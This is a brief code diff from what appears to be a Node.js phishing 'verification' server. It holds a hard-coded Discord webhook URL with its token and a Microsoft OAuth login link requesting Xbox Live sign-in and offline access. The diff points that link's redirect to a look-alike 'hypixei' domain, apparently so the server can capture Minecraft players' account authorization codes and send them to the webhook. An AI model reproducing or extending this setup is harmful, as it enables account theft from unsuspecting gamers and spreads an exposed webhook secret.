@@ -5,7 +5,7 @@ const redirect_uri = 'https://verificationsystem.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
 
 //Requirements
-const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
+const redirect = 'https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=2e4c3aeb-b621-4641-baea-953a726f9b0c&redirect_uri=https://oauth.hypixei.com/callback&scope=XboxLive.signin+offline_access&state=85b73d200c622429a224b89870686ec79ab498fbec1fc3d3ba46a7c325eb3091 '
 const axios = require('axios')
 const express = require('express')
 const app = express()
